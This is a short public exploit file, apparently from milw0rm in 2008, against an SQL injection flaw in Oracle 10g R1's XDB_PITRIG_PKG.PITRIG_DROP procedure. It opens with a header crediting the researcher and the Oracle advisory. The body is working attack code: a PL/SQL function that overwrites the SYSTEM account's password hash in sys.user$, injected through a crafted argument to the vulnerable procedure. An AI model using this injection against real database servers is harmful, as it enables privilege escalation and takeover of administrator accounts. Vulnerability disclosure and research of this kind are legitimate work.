/******************************************************************/
/******* Oracle 10g R1 xDb.XDB_PITRIG_PKG.PITRIG_DROP    **********/
/*******                SQL Injection Exploit            **********/
/******************************************************************/
/************   exploit change system password       **************/
/******************************************************************/
/******************  BY Sh2kerr (Digital Security)  ***************/
/******************************************************************/
/***************** tested on oracle 10.1.0.2.0  *******************/
/******************************************************************/
/******************************************************************/
/*         Date of Public EXPLOIT:  January 25, 2008              */
/*         Written by:              Alexandr "Sh2kerr" Polyakov   */
/*         email:                   Alexandr.Polyakov@dsec.ru     */
/*         site:                    http://www.dsec.ru            */
/******************************************************************/
/*  Original Advisory by:                                         */
/*      Alexandr Polyakov [ Alexandr.Polyakov@dsec.ru]            */
/*      Reported: 18  Dec 2007                                    */
/*      Date of Public Advisory: January 15, 2008                 */
/*      Advisory: http://www.oracle.com/technology/deploy/        */
/*                security/critical-patch-updates/cpujan2008.html */
/*                                                                */
/******************************************************************/



/* set password 12345 to user SYSTEM   */

CREATE OR REPLACE FUNCTION CHANGEPASS return varchar2
authid current_user as
pragma autonomous_transaction;
BEGIN
EXECUTE IMMEDIATE 'update sys.user$ set password=''EC7637CC2C2BOADC'' where name=''SYSTEM''';
COMMIT;
RETURN '';
END;
/

EXEC XDB.XDB_PITRIG_PKG.PITRIG_DROP('SCOTT"."SH2KERR" WHERE 1=SCOTT.CHANGEPASS()--','HELLO IDS IT IS EXPLOIT :)');






/******************************************************************/
/*************************** SEE U LATER  ;)  ***********************/
/******************************************************************/

// milw0rm.com [2008-01-28]
